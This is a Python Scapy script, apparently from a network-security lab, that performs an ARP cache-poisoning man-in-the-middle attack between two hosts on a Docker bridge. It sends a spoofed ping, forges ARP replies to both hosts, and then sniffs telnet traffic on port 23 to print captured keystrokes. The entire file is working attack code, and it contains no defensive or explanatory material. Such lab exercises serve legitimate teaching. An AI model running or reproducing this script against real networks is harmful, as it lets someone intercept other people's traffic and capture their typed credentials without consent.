from scapy.all import *

INTERFACE = "br-387d1c452267"
HOST_A_IP = "10.9.0.5"
HOST_B_IP = "10.9.0.6"
FAKE_IP = "10.9.0.7"

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    response = sr1(arp_request, timeout=2, verbose=0)
    if response:
        return response.hwsrc
    return None

def send_ping(ping):
    sendp(ping, iface=INTERFACE, verbose=0)

print("Starting spoof attack~~~~")

print("Getting MACs")

attacker_mac = get_if_hwaddr(INTERFACE)
host_a_mac = get_mac(HOST_A_IP)
host_b_mac = get_mac(HOST_B_IP)

print("Attacker MAC: " + attacker_mac)
print("Host A MAC: " + host_a_mac)
print("Host B MAC: " + host_b_mac)

if not host_a_mac or not host_b_mac:
    print("oops")

print("step 1: send spoof ping to host A")
spoofed_ping = Ether(dst=host_a_mac, src=attacker_mac)/IP(dst=HOST_A_IP, src=FAKE_IP)/ICMP()
send_ping(spoofed_ping)

print("check host A's ARP with arp -n now. there should be a missing MAC")
input("press enter to continue")

print("step 2: poisoning host a's ARP table")
arp_reply = Ether(dst=host_a_mac, src=attacker_mac)/ARP(op=2, hwsrc=attacker_mac, psrc=FAKE_IP, hwdst=host_a_mac, pdst=HOST_A_IP)
send_ping(arp_reply)

print("check host a's arp table again, it should be filled in")
input("press enter to continue")

print("step 3: mitm")

poison_frame_a = Ether(dst=host_a_mac, src=attacker_mac)/ARP(op=2, hwsrc=attacker_mac, psrc=HOST_B_IP, hwdst=host_a_mac, pdst=HOST_A_IP)
poison_frame_b = Ether(dst=host_b_mac, src=attacker_mac)/ARP(op=2, hwsrc=attacker_mac, psrc=HOST_A_IP, hwdst=host_b_mac, pdst=HOST_B_IP)

send_ping(poison_frame_a)
send_ping(poison_frame_b)

def process_packet(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load
        try:
            ascii_data = payload.decode('ascii')
            printable_char = ascii_data[0]
            if printable_char:
                print("Telnet keystroke: " + printable_char)
        except:
            pass
sniff(iface=INTERFACE, prn=process_packet, filter="tcp dst port 23", store=0)


